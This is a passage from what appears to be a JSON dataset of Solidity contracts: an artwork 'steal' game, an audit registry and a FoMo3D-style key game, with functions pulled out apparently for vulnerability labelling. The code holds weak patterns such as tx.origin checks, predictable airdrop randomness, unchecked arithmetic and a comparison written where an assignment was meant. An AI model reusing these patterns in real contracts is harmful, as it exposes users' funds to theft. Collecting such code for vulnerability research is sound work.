artworkId = oldest;\n } else {\n index = mapToNewRange(randomNumbers, numArtworks, maxNumber);\n artworkId = ids[index];\n }\n }\n function removeArtworksByString(string result,uint32 howmany) internal returns (uint128 pot) {\n uint32[] memory stolenArtworks = new uint32[](howmany);\n uint8[] memory artworkTypes = new uint8[](howmany);\n uint32[] memory sequenceNumbers = new uint32[](howmany);\n uint256[] memory artworkValues = new uint256[](howmany);\n address[] memory players = new address[](howmany);\n if (howmany>0) {\n uint32[] memory randomNumbers = getNumbersFromString(result, \",\", howmany);\n uint16 index;\n uint32 artworkId;\n Artwork memory artworkData;\n pot = 0;\n if (oldest!=0)\n lastcombo++;\n for (uint32 i = 0; i < howmany; i++) {\n (artworkId,index) = findIndexFromRandomNumber(randomNumbers[i]);\n artworkData = artworks[artworkId];\n pot += artworkData.value;\n stolenArtworks[i] = artworkId;\n artworkTypes[i] = artworkData.artworkType;\n sequenceNumbers[i] = artworkData.sequenceNumber;\n artworkValues[i] = artworkData.value;\n players[i] = artworkData.player;\n replaceArtwork(index);\n }\n } else {\n pot = 0;\n }\n emit newSteal(now,stolenArtworks,artworkTypes,sequenceNumbers,artworkValues,players);\n }\n function __callback(bytes32 myid, string result) public {\n uint gaslimit = gasleft();\n uint32 howmany;\n uint128 pot;\n uint gasCost;\n uint128 distpot;\n uint oraclizeFeeTmp = 0;\n if (msg.sender == oraclize_cbAddress() && myid == nextStealId) {\n howmany = numArtworks < 100 ? (numArtworks < 10 ? (numArtworks < 2 ? 0 : 1) : numArtworks / 10) : 10;\n pot = removeArtworksByString(result,howmany);\n gasCost = ((oraclizeFee * etherExchangeLikeCoin) / 1 ether) * 1 ether + 1 ether ;\n if (pot > gasCost)\n distpot = uint128(pot - gasCost);\n distribute(distpot);\n oraclizeFeeTmp = oraclizeFee;\n oraclizeFee = 0;\n }\n emit newOraclizeCallback(myid,result,howmany,pot,distpot,oraclizeFeeTmp,gaslimit,etherExchangeLikeCoin);\n }\n function updateNextStealTime(uint32 inseconds) internal {\n nextStealTimestamp = now + inseconds;\n }\n function distribute(uint128 totalAmount) internal {\n uint32 artworkId;\n uint128 amount = ( totalAmount * 60 ) / 100;\n uint128 valueSum = 0;\n uint128 totalAmountRemain = totalAmount;\n uint128[] memory shares = new uint128[](values.length+1);\n if (totalAmount>0) {\n for (uint8 v = 0; v < values.length; v++) {\n if (numArtworksXType[v] > 0) valueSum += values[v];\n }\n for (uint8 m = 0; m < values.length; m++) {\n if (numArtworksXType[m] > 0)\n shares[m] = ((amount * (values[m] * 1000 / valueSum) / numArtworksXType[m]) / (1000 ether)) * (1 ether);\n }\n for (uint16 i = 0; i < numArtworks; i++) {\n artworkId = ids[i];\n amount = shares[artworks[artworkId].artworkType];\n artworks[artworkId].value += amount;\n totalAmountRemain -= amount;\n }\n setOldest();\n artworks[oldest].value += totalAmountRemain;\n shares[shares.length-1] = totalAmountRemain;\n }\n lastStealBlockNumber = block.number;\n updateNextStealTime(timeTillNextSteal());\n emit newStealRewards(totalAmount,shares);\n }\n function get30Artworks(uint16 startIndex) public constant returns(uint32[] artworkIds,uint8[] types,uint32[] sequenceNumbers, uint128[] artworkValues,address[] players) {\n uint32 endIndex = startIndex + 30 > numArtworks ? numArtworks : startIndex + 30;\n uint32 id;\n uint32 num = endIndex - startIndex;\n artworkIds = new uint32[](num);\n types = new uint8[](num);\n sequenceNumbers = new uint32[](num);\n artworkValues = new uint128[](num);\n players = new address[](num);\n uint16 j = 0;\n for (uint16 i = startIndex; i < endIndex; i++) {\n id = ids[i];\n artworkIds[j] = id;\n types[j] = artworks[id].artworkType;\n sequenceNumbers[j] = artworks[id].sequenceNumber;\n artworkValues[j] = artworks[id].value;\n players[j] = artworks[id].player;\n j++;\n }\n }\n function getRemainTime() public constant returns(uint remainTime) {\n if (nextStealTimestamp>now) remainTime = nextStealTimestamp - now;\n }\n function setCustomGasPrice(uint gasPrice) public ownerOrOperator {\n oraclize_setCustomGasPrice(gasPrice);\n }\n function setOraclizeGas(uint32 newGas) public ownerOrOperator {\n oraclizeGas = newGas;\n }\n function setOraclizeGasExtraArtwork(uint32 newGas) public ownerOrOperator {\n oraclizeGasExtraArtwork = newGas;\n }\n function setEtherExchangeLikeCoin(uint32 newValue) public ownerOrOperator {\n etherExchangeLikeCoin = newValue;\n }\n function setMaxArtworks(uint16 number) public ownerOrOperator {\n maxArtworks = number;\n }\n function setNumOfTimesSteal(uint8 adjust) public ownerOrOperator {\n numOfTimesSteal = adjust;\n }\n function updateNextStealTimeByOperator(uint32 inseconds) public ownerOrOperator {\n nextStealTimestamp = now + inseconds;\n }\n function mapToNewRange(uint number, uint range, uint max) pure internal returns(uint16 randomNumber) {\n return uint16(number * range / max);\n }\n function getNumbersFromString(string s, string delimiter, uint32 howmany) public pure returns(uint32[] numbers) {\n var s2 = s.toSlice();\n var delim = delimiter.toSlice();\n string[] memory parts = new string[](s2.count(delim) + 1);\n for(uint8 i = 0; i < parts.length; i++) {\n parts[i] = s2.split(delim).toString();\n }\n numbers = new uint32[](howmany);\n if (howmany>parts.length) howmany = uint32(parts.length);\n for (uint8 j = 0; j < howmany; j++) {\n numbers[j] = uint32(parseInt(parts[j]));\n }\n return numbers;\n }\n function tokenCallback(address _from, uint256 _value, bytes _data) public {\n require(msg.sender == address(like));\n uint[] memory result;\n uint len;\n assembly {\n len := mload(_data)\n let c := 0\n result := mload(0x40)\n for { let i := 0 } lt(i, len) { i := add(i, 0x20) }\n {\n mstore(add(result, add(i, 0x20)), mload(add(_data, add(i, 0x20))))\n c := add(c, 1)\n }\n mstore(result, c)\n mstore(0x40, add(result , add(0x20, mul(c, 0x20))))\n }\n uint8[] memory result2 = new uint8[](result.length);\n for (uint16 j=0;j<result.length; j++) {\n result2[j] = uint8(result[j]);\n }\n giveArtworks(result2, _from, _value);\n }\n}",
  "extract_feature": [
    "function distribute(uint128 totalAmount) internal {\nuint32 artworkId;\nuint128 amount = ( totalAmount * 60 ) / 100;\nuint128 valueSum = 0;\nuint128 totalAmountRemain = totalAmount;\nuint128[] memory shares = new uint128[](values.length+1);\nif (totalAmount>0) {\nfor (uint8 v = 0; v < values.length; v++) {\nif (numArtworksXType[v] > 0) valueSum += values[v];\n}\nfor (uint8 m = 0; m < values.length; m++) {\nif (numArtworksXType[m] > 0)\nshares[m] = ((amount * (values[m] * 1000 / valueSum) / numArtworksXType[m]) / (1000 ether)) * (1 ether);\n}\nfor (uint16 i = 0; i < numArtworks; i++) {\nartworkId = ids[i];\namount = shares[artworks[artworkId].artworkType];\nartworks[artworkId].value += amount;\ntotalAmountRemain -= amount;\n}\nsetOldest();\nartworks[oldest].value += totalAmountRemain;\nshares[shares.length-1] = totalAmountRemain;\n}\nlastStealBlockNumber = block.number;\nupdateNextStealTime(timeTillNextSteal());\nemit newStealRewards(totalAmount,shares);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b5e"
  },
  "filename": "2919.sol",
  "content": "pragma solidity ^0.4.24;\ncontract Audit {\n struct Proof {\n uint level;\n uint insertedBlock;\n bytes32 ipfsHash;\n address auditedBy;\n }\n event AttachedEvidence(address indexed auditorAddr, bytes32 indexed codeHash, bytes32 ipfsHash);\n event NewAudit(address indexed auditorAddr, bytes32 indexed codeHash);\n mapping (address => mapping (bytes32 => Proof)) public auditedContracts;\n mapping (address => bytes32[]) public auditorContracts;\n function isVerifiedAddress(address _auditorAddr, address _contractAddr) public view returns(uint) {\n bytes32 codeHash = getCodeHash(_contractAddr);\n return auditedContracts[_auditorAddr][codeHash].level;\n }\n function isVerifiedCode(address _auditorAddr, bytes32 _codeHash) public view returns(uint) {\n return auditedContracts[_auditorAddr][_codeHash].level;\n }\n function getCodeHash(address _contractAddr) public view returns(bytes32) {\n return keccak256(codeAt(_contractAddr));\n }\n function addAudit(bytes32 _codeHash, uint _level, bytes32 _ipfsHash) public {\n address auditor = msg.sender;\n require(auditedContracts[auditor][_codeHash].insertedBlock == 0);\n auditedContracts[auditor][_codeHash] = Proof({\n level: _level,\n auditedBy: auditor,\n insertedBlock: block.number,\n ipfsHash: _ipfsHash\n });\n auditorContracts[auditor].push(_codeHash);\n emit NewAudit(auditor, _codeHash);\n }\n function addEvidence(bytes32 _codeHash, uint _newLevel, bytes32 _ipfsHash) public {\n address auditor = msg.sender;\n require(auditedContracts[auditor][_codeHash].insertedBlock != 0);\n if (auditedContracts[auditor][_codeHash].level != _newLevel)\n auditedContracts[auditor][_codeHash].level = _newLevel;\n emit AttachedEvidence(auditor, _codeHash, _ipfsHash);\n }\n function codeAt(address _addr) public view returns (bytes code) {\n assembly {\n let size := extcodesize(_addr)\n code := mload(0x40)\n mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))\n mstore(code, size)\n extcodecopy(_addr, add(code, 0x20), 0, size)\n }\n }\n}",
  "extract_feature": [
    "function addAudit(bytes32 _codeHash, uint _level, bytes32 _ipfsHash) public {\naddress auditor = msg.sender;\nrequire(auditedContracts[auditor][_codeHash].insertedBlock == 0);\nauditedContracts[auditor][_codeHash] = Proof({\nlevel: _level,\nauditedBy: auditor,\ninsertedBlock: block.number,\nipfsHash: _ipfsHash\n});\nauditorContracts[auditor].push(_codeHash);\nemit NewAudit(auditor, _codeHash);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b5f"
  },
  "filename": "2947.sol",
  "content": "pragma solidity ^0.4.24;\ncontract PCKevents {\n event onNewName\n (\n uint256 indexed playerID,\n address indexed playerAddress,\n bytes32 indexed playerName,\n bool isNewPlayer,\n uint256 affiliateID,\n address affiliateAddress,\n bytes32 affiliateName,\n uint256 amountPaid,\n uint256 timeStamp\n );\n event onEndTx\n (\n uint256 compressedData,\n uint256 compressedIDs,\n bytes32 playerName,\n address playerAddress,\n uint256 ethIn,\n uint256 keysBought,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount,\n uint256 potAmount,\n uint256 airDropPot\n );\n event onWithdraw\n (\n uint256 indexed playerID,\n address playerAddress,\n bytes32 playerName,\n uint256 ethOut,\n uint256 timeStamp\n );\n event onWithdrawAndDistribute\n (\n address playerAddress,\n bytes32 playerName,\n uint256 ethOut,\n uint256 compressedData,\n uint256 compressedIDs,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount\n );\n event onBuyAndDistribute\n (\n address playerAddress,\n bytes32 playerName,\n uint256 ethIn,\n uint256 compressedData,\n uint256 compressedIDs,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount\n );\n event onReLoadAndDistribute\n (\n address playerAddress,\n bytes32 playerName,\n uint256 compressedData,\n uint256 compressedIDs,\n address winnerAddr,\n bytes32 winnerName,\n uint256 amountWon,\n uint256 newPot,\n uint256 PCPAmount,\n uint256 genAmount\n );\n event onAffiliatePayout\n (\n uint256 indexed affiliateID,\n address affiliateAddress,\n bytes32 affiliateName,\n uint256 indexed roundID,\n uint256 indexed buyerID,\n uint256 amount,\n uint256 timeStamp\n );\n event onPotSwapDeposit\n (\n uint256 roundID,\n uint256 amountAddedToPot\n );\n}\ncontract modularKey is PCKevents {}\ncontract PlayCoinKey is modularKey {\n using SafeMath for *;\n using NameFilter for string;\n using PCKKeysCalcLong for uint256;\n PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0x14229878e85e57FF4109dc27bb2EfB5EA8067E6E);\n string constant public name = \"PlayCoin Game\";\n string constant public symbol = \"PCK\";\n uint256 private rndExtra_ = 2 minutes;\n uint256 private rndGap_ = 15 minutes;\n uint256 constant private rndInit_ = 24 hours;\n uint256 constant private rndInc_ = 30 seconds;\n uint256 constant private rndMax_ = 24 hours;\n uint256 constant private rndMin_ = 10 minutes;\n uint256 public reduceMul_ = 3;\n uint256 public reduceDiv_ = 2;\n uint256 public rndReduceThreshold_ = 10e18;\n bool public closed_ = false;\n address private admin = msg.sender;\n uint256 public airDropPot_;\n uint256 public airDropTracker_ = 0;\n uint256 public rID_;\n mapping (address => uint256) private blacklist_;\n mapping (address => uint256) public pIDxAddr_;\n mapping (bytes32 => uint256) public pIDxName_;\n mapping (uint256 => PCKdatasets.Player) public plyr_;\n mapping (uint256 => mapping (uint256 => PCKdatasets.PlayerRounds)) public plyrRnds_;\n mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;\n mapping (uint256 => PCKdatasets.Round) public round_;\n mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;\n mapping (uint256 => PCKdatasets.TeamFee) public fees_;\n mapping (uint256 => PCKdatasets.PotSplit) public potSplit_;\n constructor()\n public\n {\n blacklist_[0xB04B473418b6f09e5A1f809Ae2d01f14211e03fF] = 1;\n fees_[0] = PCKdatasets.TeamFee(30,6);\n fees_[1] = PCKdatasets.TeamFee(43,0);\n fees_[2] = PCKdatasets.TeamFee(56,10);\n fees_[3] = PCKdatasets.TeamFee(43,8);\n potSplit_[0] = PCKdatasets.PotSplit(15,10);\n potSplit_[1] = PCKdatasets.PotSplit(25,0);\n potSplit_[2] = PCKdatasets.PotSplit(20,20);\n potSplit_[3] = PCKdatasets.PotSplit(30,10);\n }\n modifier isActivated() {\n require(activated_ == true, \"its not ready yet. check ?eta in discord\");\n _;\n }\n modifier isRoundActivated() {\n require(round_[rID_].ended == false, \"the round is finished\");\n _;\n }\n modifier isHuman() {\n require(msg.sender == tx.origin, \"sorry humans only\");\n _;\n }\n modifier isWithinLimits(uint256 _eth) {\n require(_eth >= 1000000000, \"pocket lint: not a valid currency\");\n require(_eth <= 100000000000000000000000, \"no vitalik, no\");\n _;\n }\n modifier onlyAdmins() {\n require(msg.sender == admin, \"onlyAdmins failed - msg.sender is not an admin\");\n _;\n }\n modifier notBlacklist() {\n require(blacklist_[msg.sender] == 0, \"bad man,shut!\");\n _;\n }\n function addBlacklist(address _black,bool _in) onlyAdmins() public {\n if( _in ){\n blacklist_[_black] = 1 ;\n } else {\n delete blacklist_[_black];\n }\n }\n function getBlacklist(address _black) onlyAdmins() public view returns(bool) {\n return blacklist_[_black] > 0;\n }\n function kill () onlyAdmins() public {\n require(round_[rID_].ended == true && closed_ == true, \"the round is active or not close\");\n selfdestruct(admin);\n }\n function getRoundStatus() isActivated() public view returns(uint256, bool){\n return (rID_, round_[rID_].ended);\n }\n function setThreshold(uint256 _threshold, uint256 _mul, uint256 _div) onlyAdmins() public {\n require(_threshold > 0, \"threshold must greater 0\");\n require(_mul > 0, \"mul must greater 0\");\n require(_div > 0, \"div must greater 0\");\n rndReduceThreshold_ = _threshold;\n reduceMul_ = _mul;\n reduceDiv_ = _div;\n }\n function setEnforce(bool _closed) onlyAdmins() public returns(bool, uint256, bool) {\n closed_ = _closed;\n if( !closed_ && round_[rID_].ended == true && activated_ == true ){\n nextRound();\n }\n else if( closed_ && round_[rID_].ended == false && activated_ == true ){\n round_[rID_].end = now - 1;\n }\n return (closed_, rID_, now > round_[rID_].end);\n }\n function()\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n buyCore(_pID, plyr_[_pID].laff, 2, _eventData_);\n }\n function buyXid(uint256 _affCode, uint256 _team)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n if (_affCode == 0 || _affCode == _pID)\n {\n _affCode = plyr_[_pID].laff;\n } else if (_affCode != plyr_[_pID].laff) {\n plyr_[_pID].laff = _affCode;\n }\n _team = verifyTeam(_team);\n buyCore(_pID, _affCode, _team, _eventData_);\n }\n function buyXaddr(address _affCode, uint256 _team)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == address(0) || _affCode == msg.sender)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxAddr_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n buyCore(_pID, _affID, _team, _eventData_);\n }\n function buyXname(bytes32 _affCode, uint256 _team)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(msg.value)\n public\n payable\n {\n PCKdatasets.EventReturns memory _eventData_ = determinePID(_eventData_);\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == '' || _affCode == plyr_[_pID].name)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxName_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n buyCore(_pID, _affID, _team, _eventData_);\n }\n function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(_eth)\n public\n {\n PCKdatasets.EventReturns memory _eventData_;\n uint256 _pID = pIDxAddr_[msg.sender];\n if (_affCode == 0 || _affCode == _pID)\n {\n _affCode = plyr_[_pID].laff;\n } else if (_affCode != plyr_[_pID].laff) {\n plyr_[_pID].laff = _affCode;\n }\n _team = verifyTeam(_team);\n reLoadCore(_pID, _affCode, _team, _eth, _eventData_);\n }\n function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(_eth)\n public\n {\n PCKdatasets.EventReturns memory _eventData_;\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == address(0) || _affCode == msg.sender)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxAddr_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n reLoadCore(_pID, _affID, _team, _eth, _eventData_);\n }\n function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)\n isActivated()\n isRoundActivated()\n isHuman()\n isWithinLimits(_eth)\n public\n {\n PCKdatasets.EventReturns memory _eventData_;\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _affID;\n if (_affCode == '' || _affCode == plyr_[_pID].name)\n {\n _affID = plyr_[_pID].laff;\n } else {\n _affID = pIDxName_[_affCode];\n if (_affID != plyr_[_pID].laff)\n {\n plyr_[_pID].laff = _affID;\n }\n }\n _team = verifyTeam(_team);\n reLoadCore(_pID, _affID, _team, _eth, _eventData_);\n }\n function withdraw()\n isActivated()\n isHuman()\n public\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n uint256 _pID = pIDxAddr_[msg.sender];\n uint256 _eth;\n if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)\n {\n PCKdatasets.EventReturns memory _eventData_;\n round_[_rID].ended = true;\n _eventData_ = endRound(_eventData_);\n _eth = withdrawEarnings(_pID);\n if (_eth > 0)\n plyr_[_pID].addr.transfer(_eth);\n _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;\n emit PCKevents.onWithdrawAndDistribute\n (\n msg.sender,\n plyr_[_pID].name,\n _eth,\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount\n );\n } else {\n _eth = withdrawEarnings(_pID);\n if (_eth > 0)\n plyr_[_pID].addr.transfer(_eth);\n emit PCKevents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);\n }\n }\n function registerNameXID(string _nameString, uint256 _affCode, bool _all)\n isHuman()\n public\n payable\n {\n bytes32 _name = _nameString.nameFilter();\n address _addr = msg.sender;\n uint256 _paid = msg.value;\n (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);\n uint256 _pID = pIDxAddr_[_addr];\n emit PCKevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);\n }\n function registerNameXaddr(string _nameString, address _affCode, bool _all)\n isHuman()\n public\n payable\n {\n bytes32 _name = _nameString.nameFilter();\n address _addr = msg.sender;\n uint256 _paid = msg.value;\n (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);\n uint256 _pID = pIDxAddr_[_addr];\n emit PCKevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);\n }\n function registerNameXname(string _nameString, bytes32 _affCode, bool _all)\n isHuman()\n public\n payable\n {\n bytes32 _name = _nameString.nameFilter();\n address _addr = msg.sender;\n uint256 _paid = msg.value;\n (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);\n uint256 _pID = pIDxAddr_[_addr];\n emit PCKevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);\n }\n function getBuyPrice()\n public\n view\n returns(uint256)\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );\n else\n return ( 75000000000000 );\n }\n function getTimeLeft()\n public\n view\n returns(uint256)\n {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now < round_[_rID].end)\n if (_now > round_[_rID].strt + rndGap_)\n return( (round_[_rID].end).sub(_now) );\n else\n return( (round_[_rID].strt + rndGap_).sub(_now) );\n else\n return(0);\n }\n function getPlayerVaults(uint256 _pID)\n public\n view\n returns(uint256 ,uint256, uint256)\n {\n uint256 _rID = rID_;\n if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)\n {\n if (round_[_rID].plyr == _pID)\n {\n return\n (\n (plyr_[_pID].win).add( ((round_[_rID].pot).mul(48)) / 100 ),\n (plyr_[_pID].gen).add( getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask) ),\n plyr_[_pID].aff\n );\n } else {\n return\n (\n plyr_[_pID].win,\n (plyr_[_pID].gen).add( getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask) ),\n plyr_[_pID].aff\n );\n }\n } else {\n return\n (\n plyr_[_pID].win,\n (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),\n plyr_[_pID].aff\n );\n }\n }\n function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)\n private\n view\n returns(uint256)\n {\n return( ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000) );\n }\n function getCurrentRoundInfo()\n public\n view\n returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)\n {\n uint256 _rID = rID_;\n return\n (\n round_[_rID].ico,\n _rID,\n round_[_rID].keys,\n round_[_rID].end,\n round_[_rID].strt,\n round_[_rID].pot,\n (round_[_rID].team + (round_[_rID].plyr * 10)),\n plyr_[round_[_rID].plyr].addr,\n plyr_[round_[_rID].plyr].name,\n rndTmEth_[_rID][0],\n rndTmEth_[_rID][1],\n rndTmEth_[_rID][2],\n rndTmEth_[_rID][3],\n airDropTracker_ + (airDropPot_ * 1000)\n );\n }\n function getPlayerInfoByAddress(address _addr)\n public\n view\n returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)\n {\n uint256 _rID = rID_;\n if (_addr == address(0))\n {\n _addr == msg.sender;\n }\n uint256 _pID = pIDxAddr_[_addr];\n return\n (\n _pID,\n plyr_[_pID].name,\n plyrRnds_[_pID][_rID].keys,\n plyr_[_pID].win,\n (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),\n plyr_[_pID].aff,\n plyrRnds_[_pID][_rID].eth\n );\n }\n function buyCore(uint256 _pID, uint256 _affID, uint256 _team, PCKdatasets.EventReturns memory _eventData_) notBlacklist() private {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n {\n core(_rID, _pID, msg.value, _affID, _team, _eventData_);\n } else {\n if ( _now > round_[_rID].end && round_[_rID].ended == false ) {\n round_[_rID].ended = true;\n _eventData_ = endRound(_eventData_);\n if( !closed_ ){\n nextRound();\n }\n _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;\n emit PCKevents.onBuyAndDistribute\n (\n msg.sender,\n plyr_[_pID].name,\n msg.value,\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount\n );\n }\n plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);\n }\n }\n function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, PCKdatasets.EventReturns memory _eventData_) private {\n uint256 _rID = rID_;\n uint256 _now = now;\n if (_now > ( round_[_rID].strt + rndGap_ ) && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))\n {\n plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);\n core(_rID, _pID, _eth, _affID, _team, _eventData_);\n } else if ( _now > round_[_rID].end && round_[_rID].ended == false ) {\n round_[_rID].ended = true;\n _eventData_ = endRound(_eventData_);\n if( !closed_ ) {\n nextRound();\n }\n _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;\n emit PCKevents.onReLoadAndDistribute\n (\n msg.sender,\n plyr_[_pID].name,\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount\n );\n }\n }\n function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, PCKdatasets.EventReturns memory _eventData_)\n private\n {\n if (plyrRnds_[_pID][_rID].keys == 0)\n _eventData_ = managePlayer(_pID, _eventData_);\n if (round_[_rID].eth < 100000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 1000000000000000000)\n {\n uint256 _availableLimit = (1000000000000000000).sub(plyrRnds_[_pID][_rID].eth);\n uint256 _refund = _eth.sub(_availableLimit);\n plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);\n _eth = _availableLimit;\n }\n if (_eth > 1000000000)\n {\n uint256 _keys = (round_[_rID].eth).keysRec(_eth);\n if (_keys >= 1000000000000000000)\n {\n updateTimer(_keys, _rID, _eth);\n if (round_[_rID].plyr != _pID)\n round_[_rID].plyr = _pID;\n if (round_[_rID].team != _team)\n round_[_rID].team = _team;\n _eventData_.compressedData = _eventData_.compressedData + 100;\n }\n if (_eth >= 100000000000000000) {\n airDropTracker_++;\n if (airdrop() == true) {\n uint256 _prize;\n if (_eth >= 10000000000000000000)\n {\n _prize = ((airDropPot_).mul(75)) / 100;\n plyr_[_pID].win = (plyr_[_pID].win).add(_prize);\n airDropPot_ = (airDropPot_).sub(_prize);\n _eventData_.compressedData += 300000000000000000000000000000000;\n } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {\n _prize = ((airDropPot_).mul(50)) / 100;\n plyr_[_pID].win = (plyr_[_pID].win).add(_prize);\n airDropPot_ = (airDropPot_).sub(_prize);\n _eventData_.compressedData += 200000000000000000000000000000000;\n } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {\n _prize = ((airDropPot_).mul(25)) / 100;\n plyr_[_pID].win = (plyr_[_pID].win).add(_prize);\n airDropPot_ = (airDropPot_).sub(_prize);\n _eventData_.compressedData += 300000000000000000000000000000000;\n }\n _eventData_.compressedData += 10000000000000000000000000000000;\n _eventData_.compressedData += _prize * 1000000000000000000000000000000000;\n airDropTracker_ = 0;\n }\n }\n _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);\n plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);\n plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);\n round_[_rID].keys = _keys.add(round_[_rID].keys);\n round_[_rID].eth = _eth.add(round_[_rID].eth);\n rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);\n _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);\n _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);\n endTx(_pID, _team, _eth, _keys, _eventData_);\n }\n }\n function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)\n private\n view\n returns(uint256)\n {\n return( (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / 